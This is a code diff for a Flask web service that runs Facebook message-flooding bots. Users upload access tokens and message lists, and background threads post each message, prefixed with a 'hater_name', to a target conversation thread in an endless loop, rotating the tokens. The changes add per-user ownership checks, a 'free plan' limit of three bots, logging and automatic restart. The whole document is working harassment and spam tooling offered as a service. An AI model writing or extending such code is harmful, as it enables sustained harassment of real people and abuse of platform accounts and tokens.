@@ -5,9 +5,11 @@ import os
 import json
 import threading
 from werkzeug.security import generate_password_hash, check_password_hash
+import shutil
 
 app = Flask(__name__)
-app.secret_key = 'your-secret-key-here'  # Replace with a secure key
+app.secret_key = os.environ.get('SECRET_KEY', 'your-secret-key-here')  # Use env var for security
+app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # Limit uploads to 16 MB
 
 # Headers for Facebook Graph API
 headers = {
@@ -21,69 +23,79 @@ headers = {
     'referer': 'www.google.com'
 }
 
-# File to store user data
+# File paths
 USERS_FILE = 'users.json'
-# File to store server data
 SERVERS_FILE = 'servers.json'
-# Dictionary to store active server threads and logs
+MAX_SERVERS_PER_USER = 3  # Limit for free plan
+
+# Thread-safe storage for active servers
 active_servers = {}
-server_logs = {}
+file_lock = threading.Lock()  # Simple lock for JSON file operations
 
-# Load users from JSON file
-def load_users():
-    if os.path.exists(USERS_FILE):
-        with open(USERS_FILE, 'r') as f:
-            return json.load(f)
-    return {}
+# Load JSON file with locking
+def load_json(file_path, default={}):
+    with file_lock:
+        if os.path.exists(file_path):
+            with open(file_path, 'r') as f:
+                return json.load(f)
+    return default
 
-# Save users to JSON file
-def save_users(users):
-    with open(USERS_FILE, 'w') as f:
-        json.dump(users, f, indent=4)
+# Save JSON file with locking
+def save_json(file_path, data):
+    with file_lock:
+        with open(file_path, 'w') as f:
+            json.dump(data, f, indent=4)
 
-# Load servers from JSON file
-def load_servers():
-    if os.path.exists(SERVERS_FILE):
-        with open(SERVERS_FILE, 'r') as f:
-            return json.load(f)
-    return {}
+# Load and save users
+load_users = lambda: load_json(USERS_FILE)
+save_users = lambda users: save_json(USERS_FILE, users)
 
-# Save servers to JSON file
-def save_servers(servers):
-    with open(SERVERS_FILE, 'w') as f:
-        json.dump(servers, f, indent=4)
+# Load and save servers
+load_servers = lambda: load_json(SERVERS_FILE)
+save_servers = lambda servers: save_json(SERVERS_FILE, servers)
 
-# Server messaging function
+# Server messaging function with file-based logging
 def run_server(server_id, thread_id, access_tokens, messages, hater_name, speed):
     post_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
     num_comments = len(messages)
     max_tokens = len(access_tokens)
     message_index = 0
+    log_file_path = os.path.join(f"Convo_{thread_id}", "server.log")
 
     while active_servers.get(server_id, {}).get('running', False):
         try:
             token_index = message_index % max_tokens
             access_token = access_tokens[token_index]
             message = messages[message_index].strip()
-            parameters = {'access_token': access_token, 'message': hater_name + ' ' + message}
+            parameters = {'access_token': access_token, 'message': f"{hater_name} {message}"}
             response = requests.post(post_url, json=parameters, headers=headers)
             current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
-            log_message = f"[+] SEND SUCCESSFUL No. {message_index + 1} Post Id {post_url} Token No. {token_index + 1}: {hater_name + ' ' + message}\nTime: {current_time}\n\n" if response.ok else f"[x] Failed to send Comment No. {message_index + 1} Post Id {post_url} Token No. {token_index + 1}: {hater_name + ' ' + message}\nTime: {current_time}\n\n"
-            server_logs.setdefault(server_id, []).append(log_message)
+            log_message = (
+                f"[+] SEND SUCCESSFUL No. {message_index + 1} Thread ID {thread_id} Token No. {token_index + 1}: {hater_name} {message}\n"
+                f"Time: {current_time}\n\n"
+            ) if response.ok else (
+                f"[x] Failed to send Comment No. {message_index + 1} Thread ID {thread_id} Token No. {token_index + 1}: {hater_name} {message}\n"
+                f"Time: {current_time}\n\n"
+            )
+            with open(log_file_path, "a") as log_file:
+                log_file.write(log_message)
             message_index = (message_index + 1) % num_comments
             time.sleep(speed)
-        except Exception as e:
-            log_message = f"[!] Error: {str(e)}\nTime: {current_time}\n\n"
-            server_logs.setdefault(server_id, []).append(log_message)
+        except requests.exceptions.RequestException as e:
+            current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+            log_message = f"[!] Request Error: {str(e)}\nTime: {current_time}\n\n"
+            with open(log_file_path, "a") as log_file:
+                log_file.write(log_message)
             time.sleep(30)
 
-# Home page (login redirect or dashboard)
+# Home page (dashboard)
 @app.route('/')
 def index():
     if 'email' not in session:
         return redirect(url_for('login'))
     servers = load_servers()
-    return render_template('index.html', servers=servers, email=session['email'])
+    user_servers = {sid: s for sid, s in servers.items() if s['user_email'] == session['email']}
+    return render_template('index.html', servers=user_servers, email=session['email'])
 
 # Signup route
 @app.route('/signup', methods=['GET', 'POST'])
@@ -95,10 +107,7 @@ def signup():
         users = load_users()
         if email in users:
             return render_template('signup.html', error='Email already exists')
-        users[email] = {
-            'full_name': full_name,
-            'password': generate_password_hash(password)
-        }
+        users[email] = {'full_name': full_name, 'password': generate_password_hash(password)}
         save_users(users)
         session['email'] = email
         return redirect(url_for('index'))
@@ -129,6 +138,11 @@ def create_server():
     if 'email' not in session:
         return redirect(url_for('login'))
     if request.method == 'POST':
+        servers = load_servers()
+        user_servers = [s for s in servers.values() if s['user_email'] == session['email']]
+        if len(user_servers) >= MAX_SERVERS_PER_USER:
+            return render_template('create_server.html', error=f'Maximum of {MAX_SERVERS_PER_USER} servers reached')
+
         thread_id = request.form.get('threadId')
         hater_name = request.form.get('kidx')
         time_interval = int(request.form.get('time'))
@@ -137,7 +151,6 @@ def create_server():
         messages_file = request.files['messagesFile']
         messages = messages_file.read().decode().splitlines()
 
-        # Create folder and save files
         folder_name = f"Convo_{thread_id}"
         os.makedirs(folder_name, exist_ok=True)
         with open(os.path.join(folder_name, "CONVO.txt"), "w") as f:
@@ -153,8 +166,6 @@ def create_server():
         with open(os.path.join(folder_name, "np.txt"), "w") as f:
             f.write("NP")
 
-        # Save server data
-        servers = load_servers()
         server_id = str(len(servers) + 1)
         servers[server_id] = {
             'thread_id': thread_id,
@@ -162,7 +173,8 @@ def create_server():
             'time_interval': time_interval,
             'access_tokens': access_tokens,
             'messages': messages,
-            'running': False
+            'running': False,
+            'user_email': session['email']
         }
         save_servers(servers)
         return redirect(url_for('index'))
@@ -174,19 +186,22 @@ def start_server(server_id):
     if 'email' not in session:
         return redirect(url_for('login'))
     servers = load_servers()
-    if server_id in servers and not servers[server_id].get('running', False):
-        servers[server_id]['running'] = True
-        save_servers(servers)
-        server_thread = threading.Thread(target=run_server, args=(
-            server_id,
-            servers[server_id]['thread_id'],
-            servers[server_id]['access_tokens'],
-            servers[server_id]['messages'],
-            servers[server_id]['hater_name'],
-            servers[server_id]['time_interval']
-        ))
-        active_servers[server_id] = {'thread': server_thread, 'running': True}
-        server_thread.start()
+    if server_id in servers and servers[server_id]['user_email'] == session['email']:
+        if not servers[server_id].get('running', False):
+            servers[server_id]['running'] = True
+            save_servers(servers)
+            server_thread = threading.Thread(target=run_server, args=(
+                server_id,
+                servers[server_id]['thread_id'],
+                servers[server_id]['access_tokens'],
+                servers[server_id]['messages'],
+                servers[server_id]['hater_name'],
+                servers[server_id]['time_interval']
+            ))
+            active_servers[server_id] = {'thread': server_thread, 'running': True}
+            server_thread.start()
+    else:
+        return "Unauthorized", 403
     return redirect(url_for('index'))
 
 # Stop server route
@@ -195,10 +210,13 @@ def stop_server(server_id):
     if 'email' not in session:
         return redirect(url_for('login'))
     servers = load_servers()
-    if server_id in servers and servers[server_id].get('running', False):
-        servers[server_id]['running'] = False
-        save_servers(servers)
-        active_servers[server_id]['running'] = False
+    if server_id in servers and servers[server_id]['user_email'] == session['email']:
+        if servers[server_id].get('running', False):
+            servers[server_id]['running'] = False
+            save_servers(servers)
+            active_servers[server_id]['running'] = False
+    else:
+        return "Unauthorized", 403
     return redirect(url_for('index'))
 
 # View server logs route
@@ -206,46 +224,57 @@ def stop_server(server_id):
 def view_logs(server_id):
     if 'email' not in session:
         return redirect(url_for('login'))
-    logs = server_logs.get(server_id, [])
-    return render_template('view_logs.html', server_id=server_id, logs=logs)
+    servers = load_servers()
+    if server_id in servers and servers[server_id]['user_email'] == session['email']:
+        thread_id = servers[server_id]['thread_id']
+        log_file_path = os.path.join(f"Convo_{thread_id}", "server.log")
+        logs = []
+        if os.path.exists(log_file_path):
+            with open(log_file_path, "r") as log_file:
+                logs = log_file.readlines()
+        return render_template('view_logs.html', server_id=server_id, logs=logs)
+    return "Unauthorized", 403
 
 # Delete server route
 @app.route('/delete_server/<server_id>')
 def delete_server(server_id):
     if 'email' not in session:
         return redirect(url_for('login'))
-    
     servers = load_servers()
-    if server_id in servers:
-        # Stop server if running
+    if server_id in servers and servers[server_id]['user_email'] == session['email']:
         if servers[server_id].get('running', False):
             servers[server_id]['running'] = False
             if server_id in active_servers:
                 active_servers[server_id]['running'] = False
-        
-        # Get thread_id for folder deletion
-        thread_id = servers[server_id].get('thread_id')
-        
-        # Remove server from servers.json
+        thread_id = servers[server_id]['thread_id']
         del servers[server_id]
         save_servers(servers)
-        
-        # Remove server logs
-        if server_id in server_logs:
-            del server_logs[server_id]
-        
-        # Remove server from active_servers
         if server_id in active_servers:
             del active_servers[server_id]
-        
-        # Delete server folder if exists
-        if thread_id:
-            folder_name = f"Convo_{thread_id}"
-            import shutil
-            if os.path.exists(folder_name):
-                shutil.rmtree(folder_name)
-    
+        folder_name = f"Convo_{thread_id}"
+        if os.path.exists(folder_name):
+            shutil.rmtree(folder_name)
+    else:
+        return "Unauthorized", 403
     return redirect(url_for('index'))
 
+# Restart running servers on app startup
+def restart_running_servers():
+    servers = load_servers()
+    for server_id, server in servers.items():
+        if server.get('running', False):
+            server_thread = threading.Thread(target=run_server, args=(
+                server_id,
+                server['thread_id'],
+                server['access_tokens'],
+                server['messages'],
+                server['hater_name'],
+                server['time_interval']
+            ))
+            active_servers[server_id] = {'thread': server_thread, 'running': True}
+            server_thread.start()
+
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    restart_running_servers()
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
